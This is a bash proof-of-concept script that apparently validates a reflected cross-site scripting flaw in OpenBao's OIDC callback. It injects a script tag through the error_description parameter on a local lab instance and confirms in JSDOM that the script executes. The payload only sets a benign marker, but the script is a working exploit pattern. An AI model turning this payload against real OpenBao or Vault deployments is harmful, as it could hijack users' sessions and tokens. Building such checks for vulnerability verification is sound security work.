#!/usr/bin/env bash
set -euo pipefail

readonly bao_addr="http://127.0.0.1:8200"
readonly callback_uri="${bao_addr}/ui/vault/auth/oidc/oidc/callback"
readonly marker='anypoc-openbao-callback-executed'
readonly payload="<script>document.documentElement.dataset.anypoc='${marker}'</script>"
readonly response_file="$(mktemp)"
trap 'rm -f "${response_file}"' EXIT

auth_response="$({
  curl --fail --silent --show-error \
    --request POST \
    --header 'Content-Type: application/json' \
    --data "$(jq -cn \
      --arg role 'lab-direct' \
      --arg redirect_uri "${callback_uri}" \
      --arg client_nonce 'anypoc-smoke-nonce' \
      '{role: $role, redirect_uri: $redirect_uri, client_nonce: $client_nonce}')" \
    "${bao_addr}/v1/auth/oidc/oidc/auth_url"
} 2>&1)" || {
  printf 'failed to request an OIDC authorization URL: %s\n' "${auth_response}" >&2
  exit 1
}

auth_url="$(jq -er '.data.auth_url' <<<"${auth_response}")"
state="$(python3 -c 'import sys, urllib.parse; print(urllib.parse.parse_qs(urllib.parse.urlsplit(sys.stdin.read()).query)["state"][0])' <<<"${auth_url}")"

http_status="$(curl --silent --show-error \
  --get \
  --output "${response_file}" \
  --write-out '%{http_code}' \
  --data-urlencode 'error=access_denied' \
  --data-urlencode "error_description=${payload}" \
  --data-urlencode "state=${state}" \
  "${bao_addr}/v1/auth/oidc/oidc/callback")"

grep -Fq "${payload}" "${response_file}"

NODE_PATH=/opt/node/lib/node_modules node - "${response_file}" "${marker}" <<'NODE'
const fs = require('fs');
const { JSDOM } = require('jsdom');

const html = fs.readFileSync(process.argv[2], 'utf8');
const expected = process.argv[3];
const dom = new JSDOM(html, {
  runScripts: 'dangerously',
  url: 'http://127.0.0.1:8200/v1/auth/oidc/oidc/callback',
});

if (dom.window.document.documentElement.dataset.anypoc !== expected) {
  process.stderr.write('callback payload did not execute in the DOM\n');
  process.exit(1);
}
NODE

printf 'callback_http_status=%s\n' "${http_status}"
printf 'raw_payload_reflected=true\n'
printf 'dom_marker=%s\n' "${marker}"
